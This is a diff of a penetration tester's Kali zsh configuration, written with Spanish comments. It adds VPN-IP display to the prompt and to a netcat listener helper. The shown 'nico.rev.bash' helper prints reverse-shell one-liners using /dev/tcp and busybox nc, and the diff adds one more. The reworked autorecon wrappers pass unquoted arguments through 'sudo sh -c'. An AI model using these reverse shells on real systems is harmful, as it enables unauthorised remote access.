@@ -91,27 +91,38 @@ if [ -n "$force_color_prompt" ]; then
     fi
 fi
 
+# 1. Asegurate que nico.myip esté ANTES del precmd
+nico.myip() {
+  ip addr show tun0 2>/dev/null | awk '/inet /{print $2}' | cut -d/ -f1 \
+  || ip addr show eth0 2>/dev/null | awk '/inet /{print $2}' | cut -d/ -f1 \
+  || echo "127.0.0.1"
+}
+
+
+setopt PROMPT_SUBST
+
 configure_prompt() {
     prompt_symbol=㉿
     # Skull emoji for root terminal
     #[ "$EUID" -eq 0 ] && prompt_symbol=💀
     case "$PROMPT_ALTERNATIVE" in
         twoline)
-            PROMPT=$'%F{%(#.blue.green)}┌──${debian_chroot:+($debian_chroot)─}${VIRTUAL_ENV:+($(basename $VIRTUAL_ENV))─}(%B%F{%(#.red.blue)}%n'$prompt_symbol$'%m%b%F{%(#.blue.green)})-[%B%F{reset}%(6~.%-1~/…/%4~.%5~)%b%F{%(#.blue.green)}]\n└─%B%(#.%F{red}#.%F{blue}$)%b%F{reset} '
-            # Right-side prompt with exit codes and background processes
-            #RPROMPT=$'%(?.. %? %F{red}%B⨯%b%F{reset})%(1j. %j %F{yellow}%B⚙%b%F{reset}.)'
+            PROMPT=$'%F{%(#.blue.green)}┌──${debian_chroot:+($debian_chroot)─}${VIRTUAL_ENV:+($(basename $VIRTUAL_ENV))─}(%B%F{%(#.red.blue)}%n%F{yellow}@$VPN_IP%b%F{%(#.blue.green)})-[%B%F{reset}%(6~.%-1~/…/%4~.%5~)%b%F{%(#.blue.green)}]\n└─%B%(#.%F{red}#.%F{blue}$)%b%F{reset} '
             ;;
         oneline)
-            PROMPT=$'${debian_chroot:+($debian_chroot)}${VIRTUAL_ENV:+($(basename $VIRTUAL_ENV))}%B%F{%(#.red.blue)}%n@%m%b%F{reset}:%B%F{%(#.blue.green)}%~%b%F{reset}%(#.#.$) '
+            PROMPT=$'${debian_chroot:+($debian_chroot)}${VIRTUAL_ENV:+($(basename $VIRTUAL_ENV))}%B%F{%(#.red.blue)}%n%F{yellow}@$VPN_IP%b%F{reset}:%B%F{%(#.blue.green)}%~%b%F{reset}%(#.#.$) '
             RPROMPT=
             ;;
         backtrack)
-            PROMPT=$'${debian_chroot:+($debian_chroot)}${VIRTUAL_ENV:+($(basename $VIRTUAL_ENV))}%B%F{red}%n@%m%b%F{reset}:%B%F{blue}%~%b%F{reset}%(#.#.$) '
+            PROMPT=$'${debian_chroot:+($debian_chroot)}${VIRTUAL_ENV:+($(basename $VIRTUAL_ENV))}%B%F{red}%n%F{yellow}@$VPN_IP%b%F{reset}:%B%F{blue}%~%b%F{reset}%(#.#.$) '
             RPROMPT=
             ;;
     esac
     unset prompt_symbol
 }
+
+configure_prompt
+
 
 # The following block is surrounded by two delimiters.
 # These delimiters must not be modified. Thanks.
@@ -199,6 +210,9 @@ xterm*|rxvt*|Eterm|aterm|kterm|gnome*|alacritty)
 esac
 
 precmd() {
+    # Actualizar VPN_IP
+    VPN_IP=$(nico.myip)
+    
     # Print the previously configured title
     print -Pnr -- "$TERM_TITLE"
 
@@ -340,6 +354,7 @@ nico.down() { # nico.down <ruta|shortcut> [out]
 
 # Main function - Start listener with cheatsheet
 function nico.nc() {
+  local ip=$(nico.myip)
   # Check if port is provided
   if [ -z "$1" ]; then
     echo "Uso: nico.nc <puerto>"
@@ -349,6 +364,7 @@ function nico.nc() {
   local port="$1"
   
   # Display cheatsheet first
+  echo "# IP: ${ip}"
   nc_cheatsheet
   
   # Get terminal size
@@ -357,6 +373,7 @@ function nico.nc() {
   # Start listener
   echo -e "\n[+] Starting listener on port $port..."
   echo -e "[+] Waiting for connection...\n"
+  echo -e "[+] IP: ${ip}\n"
   /usr/bin/nc -nlvp $port
 }
 
@@ -587,6 +604,7 @@ nico.rev.bash() {
   local port="${1:-4444}"
   echo "bash -c 'bash -i >& /dev/tcp/${ip}/${port} 0>&1'"
   echo "busybox nc ${ip} ${port} -e /bin/bash"
+  echo "busybox nc ${ip} ${port} -e sh"
 }
 
 # 9) nmap
@@ -1106,18 +1124,14 @@ export PATH="$PATH:/home/kali/.local/bin"
 #alias autorecon='sudo env "PATH=$PATH" autorecon'
 # Autorecon (larga)
 nico.autorecon() {
-  sudo $(which autorecon) -vv "$@"
+  sudo sh -c "umask 0022 && $(which autorecon) -vv $*"
 }
 
 # Autorecon (corta, sin long)
 nico.autorecon.short() {
-  sudo $(which autorecon) -vv --exclude-tags="long" "$@"
+  sudo sh -c "umask 0022 && $(which autorecon) -vv --exclude-tags='long' $*"
 }
 
-
-#alias nxc='sudo docker run --rm -it -v $(pwd):/data parrotsec/netexec:6 nxc'
-
-#alias rustscan='docker run -it --rm --name rustscan rustscan/rustscan:2.3.0'
 
 # Wrapper docker: ajusta ulimit dentro del contenedor y pasa args
 rustscan() {
@@ -1132,10 +1146,13 @@ rustscan() {
 }
 
 
-
 # Keys ES
 setxkbmap -layout es
 
 #  Target global
 [ -f ~/.targetrc ] && source ~/.targetrc
 export PATH="$HOME/.local/bin:$PATH"
+
+
+# ls nice icons
+#alias ls='eza -la --sort=time --reverse --icons'
